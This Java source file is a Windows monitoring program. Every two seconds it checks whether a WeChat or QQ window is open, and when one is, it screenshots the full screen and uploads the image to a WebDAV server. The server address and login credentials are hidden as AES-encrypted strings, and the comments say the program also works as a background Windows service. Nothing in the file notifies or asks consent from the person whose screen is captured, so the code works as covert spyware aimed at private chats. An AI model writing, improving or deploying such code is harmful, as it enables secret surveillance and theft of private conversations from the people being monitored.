/*
 * Copyright (c) 2025 unknowIfGuestInDream.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *     * Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 *     * Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 *     * Neither the name of unknowIfGuestInDream, any associated website, nor the
 * names of its contributors may be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL UNKNOWIFGUESTINDREAM BE LIABLE FOR ANY
 * DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package com.tlcsdm.windowmonitor;

import com.github.sardine.Sardine;
import com.github.sardine.SardineFactory;
import com.sun.jna.Native;
import com.sun.jna.platform.win32.GDI32Util;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;

import javax.crypto.SecretKey;
import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.atomic.AtomicReference;

/**
 * @author unknowIfGuestInDream
 */
public class WindowMonitorUploader {

    private static final String FIXED_KEY_STR = "tLcsdMwIndoWmOnt";
    private static String WEBDAV_URL = "cN2tIFNhoFyjJ44hmiYoyWKtJEbDF0HMquNp0XX98DM=";
    private static final String USERNAME = "DVlKm5MyVy9+MVLS7wTVHhx6gVPPLfi6YqM0P3oP9KQ=";
    private static final String PASSWORD = "jg8PewVdbl3x1KDrc24iwBhvVutacFQFq6MQaxt807PTn0gaMhrLNPqUt1kLi+Bb";
    private static final String MATCH_KEYWORD_1 = "微信";
    private static final String MATCH_KEYWORD_2 = "QQ";
    private static final long interval = 2000;
    /**
     * 截图模式开关：
     * false（默认）— 截取整个屏幕；
     * true         — 仅截取与匹配窗口句柄关联的窗口区域。
     */
    private static final boolean CAPTURE_WINDOW_ONLY = false;

    public static void main(String[] args) throws Exception {
        SecretKey key = AesUtil.getFixedKey(FIXED_KEY_STR);
        WEBDAV_URL = AesUtil.decrypt(WEBDAV_URL, key);
        Sardine sardine = SardineFactory.begin(AesUtil.decrypt(USERNAME, key), AesUtil.decrypt(PASSWORD, key));
        while (true) {
            try {
                WinDef.HWND hwnd = findWindowByKeyword(MATCH_KEYWORD_1);
                if (hwnd != null) {
                    uploadImage(sardine, "wechat", hwnd);
                } else {
                    hwnd = findWindowByKeyword(MATCH_KEYWORD_2);
                    if (hwnd != null) {
                        uploadImage(sardine, "qq", hwnd);
                    }
                }
                Thread.sleep(interval);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private static void uploadImage(Sardine sardine, String prefix, WinDef.HWND hwnd) throws Exception {
        BufferedImage screenshot = takeScreenshot(hwnd, CAPTURE_WINDOW_ONLY);
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy_MM_dd_HHmmss"));
        String dateCary = LocalDate.now().format(DateTimeFormatter.ofPattern("yyyyMMdd"));
        String fileName = prefix + "_" + timestamp + ".png";
        // 将截图写入 ByteArrayOutputStream
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(screenshot, "png", baos);
        baos.flush();
        byte[] imageData = baos.toByteArray();
        baos.close();
        // 直接使用 byte[] 上传文件
        sardine.put(WEBDAV_URL + dateCary + "/" + fileName, imageData);
    }

    /**
     * 使用 EnumWindows 遍历所有窗口，查找标题包含指定关键字的窗口句柄。
     * 不依赖 GetForegroundWindow，在 Windows 服务（Session 0）中同样有效。
     *
     * @param keyword 窗口标题关键字
     * @return 匹配的窗口句柄，若未找到则返回 null
     */
    static WinDef.HWND findWindowByKeyword(String keyword) {
        AtomicReference<WinDef.HWND> result = new AtomicReference<>();
        User32.INSTANCE.EnumWindows((hwnd, data) -> {
            if (result.get() != null) {
                return false;
            }
            char[] buffer = new char[1024];
            User32.INSTANCE.GetWindowText(hwnd, buffer, buffer.length);
            String title = Native.toString(buffer);
            if (title.contains(keyword)) {
                result.set(hwnd);
                return false;
            }
            return true;
        }, null);
        return result.get();
    }

    /**
     * 使用 GDI32Util 截图。
     * 与 java.awt.Robot 不同，此方法通过 Windows GDI API 完成截图，
     * 在以 Windows 服务方式运行（Session 0）时同样适用。
     *
     * @param hwnd              目标窗口句柄
     * @param captureWindowOnly true — 仅截取 hwnd 对应的窗口区域；
     *                          false — 截取整个屏幕（传入桌面根窗口）
     * @return 截取的图像
     */
    static BufferedImage takeScreenshot(WinDef.HWND hwnd, boolean captureWindowOnly) {
        if (captureWindowOnly) {
            return GDI32Util.getScreenshot(hwnd);
        }
        // 传入桌面根窗口句柄以截取整个屏幕
        return GDI32Util.getScreenshot(User32.INSTANCE.GetDesktopWindow());
    }
}
